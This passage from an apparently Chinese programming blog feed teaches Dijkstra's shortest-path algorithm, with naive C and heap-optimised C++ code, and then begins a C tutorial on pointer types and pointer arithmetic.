选取策略(贪心)某种程度上是为了给<code>松弛</code>操作使用哪些边提供了一个依据.学习了SPFA算法(基于动态规划,体现有BFS的思想)后可能会有更深刻的体会.</p><p>换句话说,主观上讲,贪心就是此算法的&quot;搜索依据&quot;.而BFS是SPFA的&quot;搜索依据&quot;.</p><h2 id="算法局限">算法局限</h2><p>Dijkstra算法不能有效处理带<code>负权</code>的图,这是因为一旦存在负权,那就有可能在后面通过一个次优点的一条负权的出边,缩短之前某一次<code>松弛</code>用的点<code>v</code>的<code>dis[v]</code>,使得路径之和进一步缩小,这就导致了错误.</p><p>举一个简单的例子:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231129023704021.png" alt="image-20231129023704021" style="zoom:50%;" /><p>访问到A时,选择最优点C(A-&gt;B为2,A-&gt;C为1,后者更短),将C标记,之后意味着C不能再被更新了.</p><p>但是显然,A-&gt;B-&gt;C这条路径计算出的A到C的路径长度为<code>0</code>,显然比原来的<code>1</code>更短,发生错误.</p><p>所以该算法在有负权边的图中无法使用.</p><h2 id="朴素写法时间复杂度">朴素写法时间复杂度</h2><p>之所以说<code>朴素写法</code>是因为该算法后续还有一个十分重要的<code>堆优化</code>可以大幅提高效率.</p><p>对于一个n个顶点,m条边的图:</p><p>显然,大循环要将所有的n个点进行访问一次,每次寻找最小dis的点需要一个O(n)的循环.另外还需要访问所有的边一遍(尽管是在大循环中,并且基于寻找的最小dis的点),需要O(m).</p><p>所以时间复杂度为<code>O(n^2+m)</code>,当n十分大,m相对较小时不占优势.</p><p>(但是鉴于此算法的贪心策略,后续可以有一种堆优化.)</p><h1 id="朴素写法">朴素写法</h1><p>前置知识:请先去学会<code>邻接表</code>或<code>链式前向星</code>.邻接矩阵在此算法中不占优势,特别是当图十分<code>稀疏</code>的时候更加明显.</p><p>本代码示例为纯C语言,采用<code>链式前向星</code>存图.<s>简单又高效,OIer的首选!好东西!</s></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 迪杰斯特拉算法-朴素写法-链式前向星存图</span></span><br><span class="line"><span class="comment">// 可移步洛谷P3371进行评测</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> to, dis, next;</span><br><span class="line">&#125; Edge; <span class="comment">// 边的存储结构,分别为终点,权值,下一条边的下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// 链式前向星实际就是静态的邻接表</span></span><br><span class="line">    Edge *edge; <span class="comment">// 边表</span></span><br><span class="line">    <span class="type">int</span> *head; <span class="comment">// 记录起点的第一条出边下标的表</span></span><br><span class="line">    <span class="type">int</span> cnt; <span class="comment">// 构建链式前向星时记录边数(下标)</span></span><br><span class="line">    <span class="type">int</span> n, m; <span class="comment">// 点数,边数</span></span><br><span class="line">    <span class="type">int</span> start; <span class="comment">// 单源最短路起点,本代码没有封装一个算法结构体，所以这里直接用graph-&gt;start代替</span></span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_edge</span><span class="params">(Graph *graph, <span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">    <span class="comment">// 构建链式前向星</span></span><br><span class="line">    graph-&gt;edge[++graph-&gt;cnt].to = to;</span><br><span class="line">    graph-&gt;edge[graph-&gt;cnt].dis = w;</span><br><span class="line">    graph-&gt;edge[graph-&gt;cnt].next = graph-&gt;head[from];</span><br><span class="line">    graph-&gt;head[from] = graph-&gt;cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_graph</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="comment">// 输入n,m,start</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;graph-&gt;n, &amp;graph-&gt;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;graph-&gt;start); <span class="comment">// 本代码没有封装一个算法结构体，所以这里直接用graph-&gt;start代替</span></span><br><span class="line"></span><br><span class="line">    graph-&gt;head = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line">    graph-&gt;edge = (Edge *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Edge) * (graph-&gt;m + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    graph-&gt;cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; i++)</span><br><span class="line">        graph-&gt;head[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入m条边</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph-&gt;m; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> from, to, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;from, &amp;to, &amp;w);</span><br><span class="line">        add_edge(graph, from, to, w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *<span class="title function_">dijkstra</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> *vis = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line">    <span class="type">int</span> *dis = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; i++) &#123;</span><br><span class="line">        dis[i] = <span class="number">0x7FFFFFFF</span>; <span class="comment">// 此值为signed int类型能够存储的最大值,</span></span><br><span class="line">        <span class="comment">// 一般不容易达到,可以作为数学意义上的无穷大来使用,当然如果确实有达到这么大的值,</span></span><br><span class="line">        <span class="comment">// 可以使用 -1 加特判来替代</span></span><br><span class="line">        vis[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输入起点</span></span><br><span class="line">    <span class="comment">// scanf(&quot;%d&quot;, &amp;start);</span></span><br><span class="line">    start = graph-&gt;start; <span class="comment">// 本代码没有封装一个算法结构体，所以这里直接用graph-&gt;start代替</span></span><br><span class="line">    dis[start] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 核心代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; graph-&gt;n; ++j) &#123;</span><br><span class="line">        <span class="type">int</span> min = <span class="number">0x7FFFFFFF</span>, min_index = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 获取当前距起点最近的扩展点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[i] &lt; min &amp;&amp; !vis[i]) &#123;</span><br><span class="line">                min = dis[i];</span><br><span class="line">                min_index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min_index == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        vis[min_index] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 更新dis(松弛)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = graph-&gt;head[min_index]; i != <span class="number">0</span>; i = graph-&gt;edge[i].next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[graph-&gt;edge[i].to] &gt; dis[min_index] + graph-&gt;edge[i].dis)</span><br><span class="line">                dis[graph-&gt;edge[i].to] = dis[min_index] + graph-&gt;edge[i].dis;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(vis);</span><br><span class="line">    <span class="keyword">return</span> dis;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Graph graph;</span><br><span class="line">    init_graph(&amp;graph);</span><br><span class="line">    <span class="type">int</span> *dis = <span class="literal">NULL</span>;</span><br><span class="line">    dis = dijkstra(&amp;graph);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph.n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, dis[i]);</span><br><span class="line">    <span class="built_in">free</span>(graph.head);</span><br><span class="line">    <span class="built_in">free</span>(graph.edge);</span><br><span class="line">    <span class="built_in">free</span>(dis);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码分析全在注释里了…</p><h1 id="二叉-堆优化写法">(二叉)堆优化写法</h1><p>本质上就是要优化那个贪心策略的内循环,寻找dis最小的点O(n)实在太慢了,通过构建一个<code>二叉堆(最小堆)</code>来优化.</p><p>通过堆优化可以将时间复杂度降低到<code>O((n+m)*log(n))</code>,具体分析略,掌握<code>二叉堆</code>的时间复杂度分析会有帮助.</p><p>本代码使用C++编写,二叉堆使用C++ STL的<code>priority_queue</code>来实现(实际上仍然是利用二叉堆优化).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 同样可移步洛谷P3371进行测试</span></span><br><span class="line"><span class="comment">// 一个重要的解释:</span></span><br><span class="line"><span class="comment">// 优先队列不提供修改队内某元素优先级的的操作，</span></span><br><span class="line"><span class="comment">// 因此在得到某结点x的更小的dist后，更新dist[x]，</span></span><br><span class="line"><span class="comment">// 再直接再入队一个pair (new_dist,x) 就好。</span></span><br><span class="line"><span class="comment">// 因为new_dist比队列中结点x原先的dist要小，必定比原先那个“过时”的元素先出队</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x7FFFFFFF</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> cnt, n, m, s, head[<span class="number">100003</span>], dis[<span class="number">100003</span>];</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">100003</span>];<span class="comment">//标记数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EDGE</span> &#123;</span></span><br><span class="line"><span class="type">int</span> to, dis, next;</span><br><span class="line">&#125; edge[<span class="number">500003</span>]; <span class="comment">//head和edge--&gt;链式前向星</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt; p;<span class="comment">//first为路径长度,second为点</span></span><br><span class="line"><span class="built_in">priority_queue</span>&lt;p, <span class="built_in">vector</span>&lt;p&gt;, greater&lt;p&gt; &gt; q;<span class="comment">//优先队列,从小到大---堆优化</span></span><br><span class="line"><span class="comment">//每当搜索到一个新点，扔到优先队列里面，这样每次就取队首的绝对是最优值--</span></span><br><span class="line"><span class="comment">//--&gt;省去内层循环</span></span><br><span class="line"><span class="comment">// 这里的堆根据pair的first来排序，所以每次取出的都是最小的first</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_edge</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> from;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; from;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[++cnt].to;<span class="comment">//从1开始</span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[cnt].dis;</span><br><span class="line">edge[cnt].next = head[from];<span class="comment">//最初的0等同于NULL</span></span><br><span class="line">head[from] = cnt;<span class="comment">//from结点最新读取的一条出边作为遍历时访问的第一条边</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m &gt;&gt; s;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)</span><br><span class="line">add_edge();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) dis[i] = INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dijkstra</span><span class="params">()</span> &#123;</span><br><span class="line">dis[s] = <span class="number">0</span>;</span><br><span class="line">q.push(p(<span class="number">0</span>, s));</span><br><span class="line"><span class="keyword">while</span> (!q.empty()) &#123;</span><br><span class="line">p node = q.top(); q.pop();</span><br><span class="line"><span class="type">int</span> v = node.second;</span><br><span class="line"><span class="keyword">if</span> (vis[v])<span class="keyword">continue</span>;</span><br><span class="line">vis[v] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = head[v]; i; i = edge[i].next) &#123; <span class="comment">//终止条件为i==0即等同于NULL</span></span><br><span class="line"><span class="keyword">if</span> (dis[edge[i].to] &gt; edge[i].dis + node.first) &#123;</span><br><span class="line"><span class="comment">//node.first也可写为dis[v](?)</span></span><br><span class="line">dis[edge[i].to] = edge[i].dis + node.first;</span><br><span class="line">q.push(p(dis[edge[i].to], edge[i].to));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; dis[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">init();</span><br><span class="line">dijkstra();</span><br><span class="line">print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思想上很简单,相当于使用前面说的<code>UnSet集合</code>构建一个二叉堆(最小堆),堆排序依据为堆中每个元素对应的顶点<code>i</code>的<code>dis[i]</code>大小,这样每次获取最小dis的点就是<code>O(1)</code>,并且从堆中pop这个点是<code>O(log(n))</code>.</p><p>二者结合起来,总的时间复杂度显然比原先整个遍历的<code>O(n)</code>要小得多,这样便有了效率提升.</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
            <tag> 最短路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_2-指针类型与指针运算</title>
      <link href="/2023-11-26-270f21643ff7/"/>
      <url>/2023-11-26-270f21643ff7/</url>
      
        <content type="html"><![CDATA[<p>前面<a href="../2023-11-17-10666f346238">13_1</a>章节中提到一个问题:<code>指针指向的数据类型的大小</code>.本章节围绕这个问题展开.</p><p>前置知识:</p><ol><li>指针变量的声明,赋值,与解引用操作</li><li>指向不同类型的指针如何声明</li></ol><h1 id="指针指向类型的大小">指针指向类型的大小</h1><p>前面提到,<code>指针的类型</code>即为<code>其指向的类型的指针</code>,声明语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[类型] *[指针变量名];</span><br></pre></td></tr></table></figure><p>C语言中任何值都有其类型,例如<code>int</code>,<code>float</code>,<code>char</code>等等.</p><p>同理,每一个指针变量/指针值也都有固定的类型,例如<code>int *</code>,<code>char *</code>,<code>float *</code>等,在这些基本类型的后面加一个<code>*</code>,整体即为一个特定的<code>指针类型</code>.</p><p>一个<code>指针变量</code>只能指向与其<code>指针类型</code>一致的变量.例如<code>int *</code>的指针变量只能指向int类型的变量,而不能指向char类型的变量.原因就是,对一个指针进行寻址(解引用),必须要确定数据大小,从指针值开始,取出固定的几个字节.</p><br><p>以前面<code>int i=2;</code>为例:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121004333759.png" alt="image-20231121004333759" style="zoom:50%;" /><p>假设i在内存中的地址为<code>0xFFFFFECC</code>,如图.我们知道int变量需要4个字节才能够存下,而实际上计算机内存的每个字节都有自己的地址,那么我们讲的&quot;i的地址&quot;,实际上是使用其最小字节的地址作为&quot;代表&quot;,也就是<code>0xFFFFFECC</code>,当我们需要访问i的时候,从这个字节开始,将连续的<code>4</code>个字节一起拿出来,作为一个整体来处理,也就是<code>02 00 00 00</code>.</p><p>以上操作的前提是,我们已知了int占用4字节,即<code>sizeof(int)==4</code>.使用指针进行访问也是如此,光知道了i的起始地址还不够,我们需要知道从这个指针值起始需要取出多少字节的数据.<code>指针类型</code>就提供了这样的信息.例如我们有<code>int *p;</code>想要获取一个指针指向类型的大小,可以这样:</p><p><code>int size = sizeof(*p);</code></p><p>由于sizeof后的表达式<code>不求值</code>,所以尽管没有对p初始化,我们也是可以写<code>sizeof(*p)</code>的,想想,p为<code>int*</code>,那么对p解引用自然就是<code>int</code>了,<code>sizeof int</code>就算出来<code>4</code>,即使用指针p进行解引用,要将4个字节作为一个整体去处理.同理,<code>char *p;</code>对p解引用时只处理1个字节,因为<code>sizeof(*p)</code>即为<code>sizeof(char)</code>,结果为<code>1</code>.</p><p>也就是说,我们可以确定一个指针所指向的类型占用的字节数,根据这个值在<code>解引用</code>时取出特定长度的一段内存数据.</p><h1 id="指针运算">指针运算</h1><p>指针本质上就是一个有类型的内存地址,其实就是一个特定长度的无符号整数,所谓的<code>指针类型</code>是这个整数的特殊解释方式.</p><p>作为一个数值,指针也支持一些运算,但是由于其并不是一般的整数,他的运算较为特殊.</p><p>指针仅支持<code>整数加减法</code>,而且两个指针间只能做<code>减法</code>,因为其他的运算没有任何意义.另外,指针运算往往离不开数组.</p><h2 id="指针加法">指针加法</h2><p>一个指针(地址)加1,即将地址加1,代表着这个指针指向下一个内存单元,即紧挨着原来那个字节再往后一个位置的字节.同理,一个指针加n,代表着这个指针指向原来的地址往后n个字节的地址.</p><p>例如有一个指向char类型的指针p,初始化为<code>0x1</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231211000827380.png" alt="image-20231211000827380" style="zoom:50%;" /><p>我们对p加上某个整数n,结果就是指向往后面数n个字节的那个内存地址.</p><br><p>现在问题来了,如果是<code>int *p=(int*)0x1;</code>呢?</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231211002229945.png" alt="image-20231211002229945" style="zoom:50%;" /><p>显然,<code>p+1</code>不再是指向紧挨着p之后的那个字节,而是向后<code>偏移</code>了整整4个字节,到达了<code>0x5</code>的位置.</p><br><p>这个问题其实很简单,我们在对指针进行解引用的时候,需要计算对应类型(即这个指针指向的类型)的大小,然后一次性取出特定长度的数据.对应地,我们将指针加上某个数,就是想要指向后面对应的数据,彼此之间应该是不能冲突的.</p><p>因此,我们需要做一个乘法,即:</p><p><code>(p+1)</code>等价于<code>(p)+sizeof(*p)*i</code> 其中,前者是C语言表达式,而后者是普通的数学算式!</p><p>对于<code>int *p</code>,其指向的类型<code>int</code>占用4个字节(只考虑32位以上的机器),那么在计算<code>p+1</code>的时候,要先将1乘以4,然后再和p的值进行相加,得到的就是0x1+1*4,即0x5.同理,<code>p+2</code>得到的就是0x1+2*4,即0x9.</p><p>而对于char *p,其指向的类型<code>char</code>只占用1个字节而已,所以加1仅仅是向后偏移1而已.</p><p>注:好好体会<code>偏移</code>这个词,后面会经常遇到.</p><br><p>另一方面,虽然标题写的是<code>指针加法</code>,但是两个指针进行相加是没有任何意义的…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a,b;</span><br><span class="line"><span class="type">int</span> *p1=&amp;a,*p2=&amp;b;</span><br><span class="line"><span class="comment">//int *p3=p1+p2; // 很容易理解,p3没有任何意义!因此实际上这行代码会报错</span></span><br></pre></td></tr></table></figure><h2 id="指针减法">指针减法</h2><p>一个指针减去一个常数和指针加一个常数的意义是一样的,只不过这回是向前(更低的地址)偏移了而已,这里就不举例了.</p><p>另一方面,与两个指针相加不同,两个指针相减是合法的,而且作用很大!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231211005128076.png" alt="image-20231211005128076" style="zoom:50%;" /><p>这里,p2指向p1的下一个位置(相差1个int的长度),那么<code>(p2-p1)</code>的结果是这两个指针之间间隔的元素个数.</p><p>也许加一个数组进来会更加直观:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> *p1 = &amp;a[<span class="number">0</span>], *p2 = &amp;a[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>, p2, p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, p2 - p1); <span class="comment">// 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是3,代表着二者之间相差3个int变量,从数组下标也能看出来.</p><p>也就是说,指针与指针的相减操作,表示两个指针指向的内存位置之间相隔多少个元素(而不是字节数),因此指针相减往往与数组结合使用.</p><p>另外,必须提出的一点是,这两个指针必须指向同一个数组的某两个元素,否则<code>行为未定义</code>.</p><h2 id="指针自增">指针自增</h2><p>C语言中,<code>++</code>和<code>--</code>运算符是可以用于指针变量的,和普通变量一样,对指针自增或自减都是让这个指针变量的值&quot;加一&quot;或&quot;减一&quot;.</p><p>需要注意的区别是,其效果和<code>指针加法</code>,<code>指针减法</code>相同,都是向前向后<code>偏移</code>一个元素大小的长度,而不是1个字节的大小.</p><p>对指针变量自增/自减会修改指针变量的值,也就是修改这个指针的指向.这种写法有着十分重要的作用,例如达到只使用一个指针进行遍历的效果.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 以下3种写法等价</span></span><br><span class="line">p++;</span><br><span class="line">p = p + <span class="number">1</span>;</span><br><span class="line">++p;</span><br></pre></td></tr></table></figure><p>同样需要注意的是,<code>前缀++</code>和<code>后缀++</code>的区别依然不变,如果不清楚的话请回看&quot;运算符&quot;这一部分.我们举一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> *p, *q; <span class="comment">// 2个指针变量</span></span><br><span class="line">    p = q = &amp;a[<span class="number">0</span>]; <span class="comment">// 都指向数组的第一个元素</span></span><br><span class="line">    <span class="type">int</span> *i = p++; <span class="comment">// 后缀++，i指向a[0],即p的旧值，p指向a[1]</span></span><br><span class="line">    <span class="type">int</span> *j = ++q; <span class="comment">// 前缀++，j指向a[1],即q的新值，q指向a[1]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>, *i, *j, *p, *q); <span class="comment">// 0 1 1 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 